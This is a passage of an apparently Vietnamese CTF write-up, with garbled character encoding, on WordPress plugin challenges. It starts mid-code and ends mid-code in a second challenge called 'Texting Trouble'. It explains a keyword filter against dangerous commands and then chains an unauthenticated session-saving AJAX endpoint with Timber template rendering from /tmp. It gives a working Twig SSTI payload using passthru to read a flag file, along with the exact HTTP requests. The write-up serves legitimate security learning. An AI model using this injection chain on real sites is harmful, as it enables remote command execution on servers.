</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>HÃ m nÃ y kiá»ƒm tra xem ná»™i dung file cÃ³ chá»©a cÃ¡c tá»« khÃ³a nguy hiá»ƒm nhÆ° <code>system</code>, <code>exec</code>, <code>cat</code>, <code>bash</code>, <code>env</code>, v.v. ÄÃ¢y lÃ  cÃ¡c tá»« khÃ³a cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n viá»‡c thá»±c thi lá»‡nh há»‡ thá»‘ng hoáº·c thao tÃ¡c vá»›i file, vÃ¬ váº­y náº¿u chÃºng xuáº¥t hiá»‡n, file sáº½ bá»‹ tá»« chá»‘i Ä‘á»ƒ trÃ¡nh cÃ¡c cuá»™c táº¥n cÃ´ng RCE (Remote Code Execution).</p></li></ol><h3 id=cÃ¡ch-khai-thÃ¡c-tiá»m-nÄƒng>CÃ¡ch khai thÃ¡c tiá»m nÄƒng:<a hidden class=anchor aria-hidden=true href=#cÃ¡ch-khai-thÃ¡c-tiá»m-nÄƒng>#</a></h3><p>Tuy Ä‘oáº¡n mÃ£ Ä‘Ã£ cÃ³ cÃ¡c cÆ¡ cháº¿ kiá»ƒm tra Ä‘á»ƒ ngÄƒn cháº·n viá»‡c sá»­ dá»¥ng cÃ¡c file nguy hiá»ƒm hoáº·c ná»™i dung Ä‘á»™c háº¡i, nhÆ°ng cÃ³ thá»ƒ táº­n dá»¥ng náº¿u biáº¿t trÆ°á»›c cÃ¡c tÃªn file há»£p lá»‡ trÃªn server. Cá»¥ thá»ƒ:</p><ul><li><p><strong>SSTI (Server-Side Template Injection):</strong> Do tham sá»‘ <code>page</code> Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ render file template báº±ng Timber, náº¿u cÃ³ thá»ƒ Ä‘oÃ¡n Ä‘Æ°á»£c tÃªn file template há»£p lá»‡, cÃ³ thá»ƒ khai thÃ¡c SSTI. Tuy nhiÃªn, do cÃ³ cÃ¡c biá»‡n phÃ¡p kiá»ƒm tra ná»™i dung template qua hÃ m <code>is_timber_template()</code> vÃ  <code>is_valid_template()</code>, viá»‡c trá»±c tiáº¿p thá»±c hiá»‡n RCE báº±ng SSTI qua cÃ¡c tá»« khÃ³a nguy hiá»ƒm nhÆ° <code>system</code> hay <code>exec</code> lÃ  khÃ³ thá»±c hiá»‡n.</p></li><li><p><strong>Bypass <code>validate()</code></strong>: Äá»ƒ vÆ°á»£t qua hÃ m <code>validate()</code>, báº¡n cáº§n cung cáº¥p giÃ¡ trá»‹ <code>page</code> vá»›i má»™t tÃªn file chÃ­nh xÃ¡c, khÃ´ng chá»©a pháº§n má»Ÿ rá»™ng bá»‹ cáº¥m, vÃ  khÃ´ng chá»©a cÃ¡c tá»« khÃ³a bá»‹ cáº¥m trong ná»™i dung.</p></li></ul><h3 id=phÃ¢n-tÃ­ch-tiáº¿p-theo>PhÃ¢n tÃ­ch tiáº¿p theo<a hidden class=anchor aria-hidden=true href=#phÃ¢n-tÃ­ch-tiáº¿p-theo>#</a></h3><p>Trong Ä‘oáº¡n code mÃ  bÃ i viáº¿t Ä‘á» cáº­p, cÃ³ má»™t chá»©c nÄƒng lÆ°u trá»¯ dá»¯ liá»‡u vÃ o session thÃ´ng qua hÃ m <code>save_session()</code>. Äiá»ƒm Ä‘Ã¡ng chÃº Ã½ lÃ  dá»¯ liá»‡u tá»« request cÃ³ thá»ƒ Ä‘Æ°á»£c lÆ°u vÃ o file session trÃªn server thÃ´ng qua hÃ m <code>session_start()</code>, vÃ  file nÃ y sáº½ náº±m trong thÆ° má»¥c <code>/tmp</code>, Ä‘iá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n má»™t kháº£ nÄƒng khai thÃ¡c thÃº vá»‹.</p><h3 id=phÃ¢n-tÃ­ch-chi-tiáº¿t-Ä‘oáº¡n-code-save_session>PhÃ¢n tÃ­ch chi tiáº¿t Ä‘oáº¡n code <code>save_session()</code>:<a hidden class=anchor aria-hidden=true href=#phÃ¢n-tÃ­ch-chi-tiáº¿t-Ä‘oáº¡n-code-save_session>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>save_session</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>start_session</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;session_data&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=s1>&#39;Data is saved to session.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Some error happened.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_save_session&#39;</span><span class=p>,</span> <span class=s1>&#39;save_session&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s1>&#39;wp_ajax_nopriv_save_session&#39;</span><span class=p>,</span> <span class=s1>&#39;save_session&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ol><li><p><strong>HÃ m <code>save_session()</code>:</strong></p><ul><li>HÃ m nÃ y sáº½ báº¯t Ä‘áº§u má»™t session vá»›i <code>start_session()</code>.</li><li>Náº¿u cÃ³ tham sá»‘ <code>session_data</code> Ä‘Æ°á»£c gá»­i thÃ´ng qua request, nÃ³ sáº½ lÆ°u dá»¯ liá»‡u Ä‘Ã³ vÃ o biáº¿n <code>$_SESSION['session_data']</code> vÃ  pháº£n há»“i láº¡i client thÃ´ng qua JSON ráº±ng dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c lÆ°u thÃ nh cÃ´ng. Náº¿u khÃ´ng cÃ³ tham sá»‘ nÃ y, nÃ³ sáº½ tráº£ vá» lá»—i.</li></ul></li><li><p><strong>Session file:</strong></p><ul><li>Khi hÃ m <code>start_session()</code> Ä‘Æ°á»£c gá»i, má»™t file session sáº½ Ä‘Æ°á»£c táº¡o ra trong thÆ° má»¥c <code>/tmp</code> vá»›i tÃªn dáº¡ng <code>sess_xxx</code>, trong Ä‘Ã³ <code>xxx</code> lÃ  session ID.</li><li>Dá»¯ liá»‡u Ä‘Æ°á»£c lÆ°u trá»¯ trong session sáº½ Ä‘Æ°á»£c ghi vÃ o file nÃ y. Äiá»u nÃ y bao gá»“m cáº£ ná»™i dung cá»§a <code>$_SESSION['session_data']</code>, tá»©c lÃ  giÃ¡ trá»‹ cá»§a <code>$_REQUEST['session_data']</code> sáº½ Ä‘Æ°á»£c ghi vÃ o file session trong thÆ° má»¥c <code>/tmp</code>.</li></ul></li></ol><h3 id=khai-thÃ¡c-kháº£-nÄƒng-lÆ°u-ssti-vÃ o-session-file>Khai thÃ¡c kháº£ nÄƒng lÆ°u SSTI vÃ o session file:<a hidden class=anchor aria-hidden=true href=#khai-thÃ¡c-kháº£-nÄƒng-lÆ°u-ssti-vÃ o-session-file>#</a></h3><p>Dá»±a trÃªn cÆ¡ cháº¿ xá»­ lÃ½ nÃ y, chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ lÆ°u má»™t payload khai thÃ¡c SSTI vÃ o file session trong thÆ° má»¥c <code>/tmp</code>. NhÆ° Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ pháº§n trÆ°á»›c, hÃ m <code>validate()</code> trong bÃ i kiá»ƒm tra cÃ¡c Ä‘iá»u kiá»‡n Ä‘á»ƒ quyáº¿t Ä‘á»‹nh xem file nÃ o cÃ³ thá»ƒ Ä‘Æ°á»£c render bá»Ÿi Timber. Äiá»u quan trá»ng lÃ  hÃ m nÃ y cho phÃ©p truy cáº­p vÃ o cÃ¡c file náº±m trong thÆ° má»¥c <code>/tmp</code>, vÃ¬ Timber Ä‘Ã£ Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ tÃ¬m kiáº¿m template á»Ÿ cáº£ thÆ° má»¥c <code>/tmp</code> vÃ  <code>templates</code> thÃ´ng qua Ä‘oáº¡n code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>Timber</span><span class=o>::</span><span class=nv>$dirname</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;../../../../../../../../../../../../tmp&#39;</span><span class=p>,</span> <span class=s1>&#39;templates&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Äiá»u nÃ y cÃ³ nghÄ©a lÃ , náº¿u chÃºng ta lÆ°u má»™t payload SSTI há»£p lá»‡ vÃ o file session, chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ Timber render file Ä‘Ã³ nhÆ° má»™t template vÃ  kÃ­ch hoáº¡t lá»— há»•ng SSTI.</p><h3 id=cÃ¡ch-khai-thÃ¡c>CÃ¡ch khai thÃ¡c:<a hidden class=anchor aria-hidden=true href=#cÃ¡ch-khai-thÃ¡c>#</a></h3><ol><li><p><strong>LÆ°u payload SSTI vÃ o session file:</strong></p><p>ChÃºng ta cÃ³ thá»ƒ gá»­i má»™t request tá»›i action <code>save_session</code> vá»›i tham sá»‘ <code>session_data</code> chá»©a payload SSTI.</p><p>Payload SSTI:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-twig data-lang=twig><span class=line><span class=cl><span class=cp>{{</span><span class=o>[</span><span class=s1>&#39;grep . /flag.txt&#39;</span><span class=o>]|</span><span class=nf>map</span><span class=o>(</span><span class=s1>&#39;passthru&#39;</span><span class=o>)</span><span class=cp>}}</span><span class=x>}
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>Do á»Ÿ Ä‘Ã¢y hÃ m filter cÃ³ cháº·n nhá»¯ng tá»« khoÃ¡ nhÆ° <code>system</code>, <code>cat</code>, .v.v.. nÃªn sá»­ dá»¥ng payload trÃªn thÃ¬ ğŸ‘Œ</p></blockquote><p>Gá»­i request Ä‘á»ƒ lÆ°u payload nÃ y vÃ o session:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POST /wp-admin/admin-ajax.php?action=save_session
</span></span></span><span class=line><span class=cl><span class=err>Content-Type: application/x-www-form-urlencoded
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>session_data={{[&#39;grep . /flag.txt&#39;]|map(&#39;passthru&#39;)}}}
</span></span></span></code></pre></td></tr></table></div></div></li><li><p><strong>XÃ¡c Ä‘á»‹nh tÃªn file session:</strong></p><p>File session sáº½ cÃ³ tÃªn dáº¡ng <code>sess_&lt;session_id></code>. Session ID nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c láº¥y tá»« cookie cá»§a trÃ¬nh duyá»‡t sau khi gá»­i request Ä‘áº§u tiÃªn hoáº·c báº±ng cÃ¡ch tÃ¬m session ID trá»±c tiáº¿p trÃªn server (náº¿u cÃ³ quyá»n truy cáº­p).</p></li><li><p><strong>Render file session:</strong></p><ul><li>Sau khi lÆ°u payload vÃ o session file, chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n cuá»™c táº¥n cÃ´ng SSTI báº±ng cÃ¡ch gá»­i request Ä‘áº¿n endpoint vá»›i tham sá»‘ <code>page</code> trá» Ä‘áº¿n file session vá»«a táº¡o. TÃªn file session sáº½ lÃ  <code>sess_&lt;session_id></code>.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /wp-admin/admin-ajax.php?page=sess_&lt;session_id&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>VÃ  Ä‘á»c Ä‘Æ°á»£c flag</p></li></ol><p><img loading=lazy src=https://images.viblo.asia/4e6160e9-4933-4011-bab1-2bf9da7d8b96.png alt=image.png></p><h1 id=texting-trouble>Texting Trouble<a hidden class=anchor aria-hidden=true href=#texting-trouble>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/5513ddc2-a9b1-4781-aa29-a50ae66d5085.png alt=image.png></p><p>Vá»›i challeng nÃ y, chÃºng ta cÃ¹ng phÃ¢n tÃ­ch hÃ m <code>send_message_callback()</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl> <span class=k>public</span> <span class=k>function</span> <span class=nf>send_message_callback</span><span class=p>()</span> <span class=p>{</span>             
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nv>$error</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>                                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nv>$formdata</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;formdata&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>         <span class=nx>parse_str</span><span class=p>(</span><span class=nv>$formdata</span><span class=p>,</span> <span class=nv>$output</span><span class=p>);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$message</span>     <span class=o>=</span> <span class=nx>sanitize_textarea_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_type</span>   <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_suffix</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-message-suffix&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$mess_attachment</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$output</span><span class=p>[</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>][</span><span class=s1>&#39;jot-attachment&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$jotmemkey</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;jotmemid&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>         <span class=nv>$jotseckey</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;sec&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$jotmemkey</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=k>list</span><span class=p>(</span><span class=nv>$jotgrpid</span><span class=p>,</span><span class=nv>$jotmemid</span><span class=p>)</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;-&#34;</span><span class=p>,</span> <span class=nv>$jotmemkey</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>             <span class=nv>$member</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_member</span><span class=p>(</span><span class=nv>$jotmemid</span><span class=p>);</span>
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$jotseckey</span><span class=p>)</span> <span class=o>||</span> <span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>key</span><span class=o>!==</span><span class=nv>$jotseckey</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=c1>// Bail out
</span></span></span><span class=line><span class=cl><span class=c1></span>             <span class=k>die</span><span class=p>();</span>       
</span></span><span class=line><span class=cl>         <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$message</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>             <span class=c1>// Empty message
</span></span></span><span class=line><span class=cl><span class=c1></span>             <span class=nv>$error</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>       
</span></span><span class=line><span class=cl>         <span class=p>}</span>   					 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=nv>$error</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>               <span class=k>if</span> <span class=p>(</span><span class=nx>JOTAC_Plugin</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>currentsmsprovider</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message type
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span> <span class=o>=</span>  <span class=nx>get_option</span><span class=p>(</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message-type&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$mess_type</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message suffix
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message-suffix&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$mess_suffix</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Save message content
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$smsmessage</span><span class=p>[</span><span class=s1>&#39;jot-message&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=nx>update_option</span><span class=p>(</span><span class=s1>&#39;jotac-plugin-messages&#39;</span><span class=p>,</span><span class=nv>$smsmessage</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Replace tags in message
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=nv>$message</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_replace_tags</span><span class=p>(</span><span class=nv>$message</span><span class=p>,</span><span class=nv>$member</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Append Message suffix
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$mess_suffix</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                           <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nv>$message</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nv>$mess_suffix</span> <span class=p>;</span>                     
</span></span><span class=line><span class=cl>                     <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                           <span class=nv>$fullmessage</span> <span class=o>=</span> <span class=nv>$message</span><span class=p>;</span>    
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=c1>// Optional attachment
</span></span></span><span class=line><span class=cl><span class=c1></span>                     <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$mess_attachment</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[a-zA-Z]+:\/\//&#39;</span><span class=p>,</span> <span class=nv>$mess_attachment</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;Incorrect format&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$allowed_extensions</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;txt&#39;</span><span class=p>,</span><span class=s1>&#39;png&#39;</span><span class=p>,</span><span class=s1>&#39;jpg&#39;</span><span class=p>,</span><span class=s1>&#39;pdf&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>in_array</span><span class=p>(</span><span class=nx>pathinfo</span><span class=p>(</span><span class=nv>$mess_attachment</span><span class=p>,</span> <span class=nx>PATHINFO_EXTENSION</span><span class=p>),</span> <span class=nv>$allowed_extensions</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;Filetype not supported&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$wp_dir</span> <span class=o>=</span> <span class=nx>wp_upload_dir</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$attachment_fp</span> <span class=o>=</span> <span class=nv>$wp_dir</span><span class=p>[</span><span class=s1>&#39;basedir&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;/attachments/&#39;</span> <span class=o>.</span> <span class=nv>$mess_attachment</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$available_files</span> <span class=o>=</span> <span class=nx>array_diff</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>dirname</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>)),</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;..&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                            <span class=nv>$existing_files</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>                            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$available_files</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$existing_files</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>),</span> <span class=nv>$existing_files</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$attachment_raw</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$attachment_fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$error</span> <span class=o>=</span> <span class=mi>6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                                <span class=nv>$additional_error</span> <span class=o>=</span> <span class=s2>&#34;File does not exist among [&#34;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nv>$existing_files</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;]&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                     <span class=p>}</span>
